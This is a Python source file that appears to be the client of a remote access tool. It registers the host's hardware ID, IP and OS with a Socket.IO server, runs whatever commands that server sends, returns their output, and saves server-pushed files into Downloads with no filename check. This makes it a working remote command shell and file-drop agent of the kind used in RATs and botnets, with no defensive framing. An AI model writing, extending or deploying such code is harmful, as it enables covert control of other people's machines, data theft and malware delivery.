import socketio
from command_handler import run_command
from utils.system_info import get_hwid, get_ip, get_os
from config import SERVER_URL 
import sys
import os

sio = socketio.Client()
DOWNLOAD_PATH = os.path.join(os.path.expanduser("~"), "Downloads")

@sio.event
def connect():
    print('Connection established')
    register_client()

@sio.event
def disconnect():
    print('Disconnected from server')


def connect_to_server():
    print("[*] Connecting to server...")
    sio.connect(SERVER_URL)
    sio.wait()

def register_client():
    client_info = {
        'hwid': get_hwid(),
        'ip': get_ip(),
        'os': get_os()
    }
    sio.emit("register", client_info)

@sio.on('destroy')
def destroy_connection():
    sio.disconnect()
    sys.exit(0)

@sio.on('sendCommand')
def handle_command(command):
    print(f"[*] Received command: {command}")
    response = run_command(command)
    sio.emit("commandResponse", response)

@sio.on('receiveFile')
def receive_File(data):
    filename = data["filename"]
    filebuffer = data["fileBuffer"]

    file_path = os.path.join(DOWNLOAD_PATH, filename)

    with open(file_path, "wb") as f:
        f.write(filebuffer)
    
    print(f"File {filename} received and saved in {DOWNLOAD_PATH}")